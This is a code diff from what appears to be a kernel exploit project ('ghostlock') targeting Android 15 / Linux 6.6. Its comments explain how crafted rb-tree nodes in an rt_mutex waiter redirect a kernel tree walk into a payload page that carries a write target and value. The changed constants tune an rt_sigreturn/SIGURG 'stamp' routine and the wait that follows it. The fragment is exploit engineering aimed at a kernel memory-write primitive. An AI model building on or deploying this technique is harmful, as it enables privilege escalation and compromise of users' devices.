@@ -26,13 +26,19 @@
  *   v19.d[1] -> waiter+0x68 (ww_ctx)
  *   v13..v17 -> waiter+0x00..0x50 (tree/pi_tree) - defined, not left live
  *
- * tree/pi_tree are only dead rb nodes here: the crafted rb nodes that carry the
- * write target/value live in the payload page that waiter->lock redirects the
- * walk into. Geometry evidence lives in docs/analysis/rt-sigreturn-route.md. */
+ * tree/pi_tree are written as a zero rb node. Under Linux rbtree semantics a
+ * zero node is NOT RB_EMPTY_NODE (that needs parent_color == the node address),
+ * so the walk treats it as a real (parent/left/right 0, black) node and the
+ * erase/relink of that topology is load-bearing. The crafted rb nodes that carry
+ * the write target/value live in the payload page that waiter->lock redirects
+ * the walk into. This is a structural argument from android15-6.6 common, not a
+ * proof on this image or device. Geometry evidence lives in
+ * docs/analysis/rt-sigreturn-route.md. */
 namespace ghostlock::route::rt_sigreturn {
-    /* Upper bound on one execute() stamp window. The consumer's own
-     * budget (execution.consumer.max_calls) usually binds first. */
-    inline constexpr int32_t kRtSigreturnMaxStamps = 4096;
+    /* Safety backstop for the freeze wait. The route waits for the consumer with
+     * no deadline of its own once the single stamp is done, so this bounds the
+     * spin if the profile gives neither a max-call budget nor a timeout. */
+    inline constexpr int32_t kRtSigreturnMaxWaitSpins = 1 << 24;
 
     /* Signal used to drive one rt_sigreturn() per stamp. SIGURG has a harmless
      * default action and is not used for synchronisation by the kernel or ART. */
